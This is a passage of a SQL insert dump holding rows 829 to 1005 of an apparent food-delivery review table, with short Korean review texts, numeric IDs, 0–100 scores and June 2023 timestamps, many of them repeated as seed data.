	(829, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 12, 17, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(830, '음식이 싱겁고, 퀄리티도 많이 떨어졌어요.', 12, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(831, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(832, '서비스 태도도 좋았고, 음식도 맛있었어요.', 12, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(833, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 15, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(834, '음식이 너무 맛이 없었습니다. 정말 실망했어요.', 13, 15, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(835, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 11, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(836, '음식의 맛과 양 모두 만족스러웠습니다.', 12, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(837, '음식의 맛은 그저 그랬어요. 기대한 만큼의 풍부한 맛은 아니었습니다.', 13, 16, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(838, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(839, '주문한 음식이 늦게 도착했고, 맛도 별로였어요.', 13, 22, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(840, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(841, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(842, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 12, 11, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(843, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 12, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(844, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 15, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(845, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(846, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 13, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(847, '음식이 맛있었고, 서비스도 만족스러웠어요.', 12, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(848, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(849, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 14, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(850, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 12, 13, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(851, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 12, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(852, '음식은 그럭저럭 괜찮았지만, 기대한 만큼의 만족은 얻지 못했어요.', 12, 19, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(853, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(854, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 10, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(855, '음식은 평범했고, 특별한 매력을 찾기 어려웠어요. 다음 번에는 다른 가게를 시도해볼 생각입니다.', 12, 21, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(856, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(857, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(858, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(859, '음식이 싱겁고, 퀄리티도 많이 떨어졌어요.', 15, 21, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(860, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(861, '음식이 맛있었고, 서비스도 만족스러웠어요.', 15, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(862, '맛은 있었지만, 음식의 양이 조금 부족했습니다. 배고픔을 완전히 해소하지 못했어요.', 15, 20, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(863, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 12, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(864, '서비스 태도도 좋았고, 음식도 맛있었어요.', 12, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(865, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 11, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(866, '음식이 완전히 망가진 상태로 도착했어요.', 13, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(867, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 15, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(868, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(869, '음식이 완전히 망가진 상태로 도착했어요.', 14, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(870, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 12, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(871, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(872, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 13, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(873, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 10, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(874, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 10, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(875, '음식의 맛과 가격이 모두 만족스러웠습니다.', 11, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(876, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 12, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(877, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 13, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(878, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(879, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(880, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(881, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(882, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 14, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(883, '서비스 태도도 좋았고, 음식도 맛있었어요.', 10, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(884, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(885, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 12, 18, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(886, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(887, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 12, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(888, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 10, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(889, '음식이 완전히 차가웠고, 서비스도 별로였어요.', 13, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(890, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(891, '서비스 태도도 좋았고, 음식도 맛있었어요.', 15, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(892, '음식은 평범한 수준이었고, 특별한 매력을 느끼지 못했습니다.', 13, 22, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(893, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(894, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 13, 19, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(895, '주문한 음식이 완전히 다른 것이 왔고, 맛도 별로였어요.', 14, 14, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(896, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 12, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(897, '음식이 신선하고 맛있었으며, 서비스도 좋았어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(898, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(899, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 10, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(900, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(901, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(902, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(903, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 10, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(904, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(905, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 11, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(906, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(907, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(908, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(909, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 10, 18, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(910, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 10, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(911, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 13, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(912, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 10, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(913, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 11, 14, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(914, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(915, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(916, '음식이 싱겁고, 퀄리티도 많이 떨어졌어요.', 12, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(917, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(918, '음식이 맛있었고, 서비스도 만족스러웠어요.', 10, 20, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(919, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 10, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(920, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 12, 21, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(921, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(922, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 12, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(923, '음식이 너무 늦게 도착했고, 완전히 차가웠어요.', 10, 16, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(924, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 11, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(925, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(926, '음식이 너무 맛이 없었습니다. 정말 실망했어요.', 12, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(927, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 12, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(928, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 15, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(929, '음식이 맛있었고, 서비스도 만족스러웠어요.', 14, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(930, '주문한 음식이 적절한 가격에 비해 조금 아쉬웠어요.', 10, 22, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(931, '서비스는 평범했지만, 음식의 퀄리티가 아쉬웠어요.', 10, 11, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(932, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 10, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(933, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 14, 20, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(934, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(935, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 13, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(936, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 15, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(937, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 11, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(938, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 15, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(939, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(940, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(941, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(942, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 13, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(943, '서비스가 매우 훌륭했고, 음식의 맛도 최고 수준이었습니다. 완벽한 배달 음식 경험이었습니다.', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(944, '음식의 맛과 가격이 모두 만족스러웠습니다.', 13, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(945, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(946, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 15, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(947, '최악의 경험. 주문한 음식이 완전히 망가졌어요.', 15, 21, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(948, '음식은 그럭저럭 괜찮았지만, 기대한 만큼의 만족은 얻지 못했어요.', 15, 21, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(949, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 11, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(950, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 15, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(951, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 13, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(952, '음식의 맛과 향이 정말로 탁월했어요. 매 순간 감탄을 금치 못했습니다!', 12, 15, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(953, '음식의 맛과 퀄리티가 너무나 탁월해서 기분이 너무 좋았어요. 반복 주문 의사가 높아졌습니다.', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(954, '서비스 태도도 좋았고, 음식도 맛있었어요.', 13, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(955, '음식은 평범했고, 특별한 매력을 찾기 어려웠어요. 다음 번에는 다른 가게를 시도해볼 생각입니다.', 15, 22, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(956, '음식의 맛은 그저 그랬어요. 특별한 인상을 남기지 않았습니다.', 10, 21, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(957, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(958, '음식의 맛과 양 모두 만족스러웠습니다.', 11, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(959, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 10, 21, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(960, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 13, 15, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(961, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 11, 13, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(962, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 14, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(963, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 11, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(964, '주문한 음식이 기대 이상이었고, 배달도 빨랐어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(965, '서비스는 만족스럽지 않았지만, 음식은 괜찮았어요.', 13, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(966, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 11, 12, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(967, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 14, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(968, '음식의 퀄리티와 가격이 모두 만족스러웠어요.', 12, 11, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(969, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 11, 12, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(970, '음식이 맛있었고, 서비스도 만족스러웠어요.', 13, 16, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(971, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 14, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(972, '음식의 맛, 퀄리티, 서비스 모두 최고였어요. 완벽한 배달 음식 경험을 선사해준 가게입니다.', 14, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(973, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 13, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(974, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 13, 18, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(975, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 14, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(976, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 12, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(977, '서비스도 엉망이었고, 음식도 실망스러웠어요.', 14, 14, 0, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(978, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(979, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 14, 17, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(980, '음식은 그럭저럭 맛있었지만, 가격이 조금 아쉬웠어요.', 11, 14, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(981, '음식이 전혀 맛있지 않았고, 퀄리티도 많이 떨어졌어요.', 10, 16, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(982, '음식의 맛과 양 모두 만족스러웠습니다.', 10, 14, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(983, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 15, 17, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(984, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 15, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(985, '음식의 맛과 가격이 모두 만족스러웠습니다.', 10, 19, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(986, '서비스 태도가 좋지 않았고, 음식도 별로였어요.', 13, 15, 20, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(987, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 10, 18, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(988, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 11, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(989, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 13, 19, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(990, '음식의 퀄리티와 다양한 맛의 조화가 완벽했습니다. 정말로 매우 훌륭한 경험이었어요.', 10, 22, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(991, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 15, 13, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(992, '최고의 음식을 경험한 것 같아요. 신선한 재료와 완벽한 조리법이 참신함을 느끼게 해줬어요.', 14, 21, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(993, '음식의 퀄리티는 평범했지만, 서비스는 별로였어요.', 10, 11, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(994, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 15, 11, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(995, '음식이 정말로 맛있고 신선했어요. 가게의 전문성과 정성이 돋보였습니다.', 10, 17, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(996, '음식은 그럭저럭 괜찮았지만, 특별한 매력은 없었어요.', 12, 13, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(997, '음식은 평범했고, 배달 시간도 그럭저럭이었어요.', 12, 15, 60, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(998, '주문한 음식이 상상을 초월하는 맛이었습니다. 완전한 만족을 느낄 수 있었어요.', 13, 16, 100, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(999, '주문한 음식이 그저 그랬어요. 약간 실망스러웠습니다.', 13, 12, 40, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(1000, '서비스 태도도 좋았고, 음식도 맛있었어요.', 13, 22, 80, '2023-06-05 23:22:29', '2023-06-05 23:22:29', NULL),
	(1001, '주문한 음식이 신선하고, 배달도 빨리 왔어요.', 11, 20, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1002, '서비스가 매우 친절하고, 음식의 맛도 정말로 훌륭했습니다. 완벽한 조합이었어요.', 14, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1003, '주문한 음식이 훌륭하고, 배달이 정확했어요.', 15, 21, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1004, '음식이 정말로 맛있었고, 특별한 재료와 조리법이 돋보였습니다. 정말로 훌륭한 가게입니다.', 11, 21, 100, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
	(1005, '서비스가 친절하고, 음식도 맛있어서 좋았어요.', 15, 20, 80, '2023-06-05 23:24:10', '2023-06-05 23:24:10', NULL),
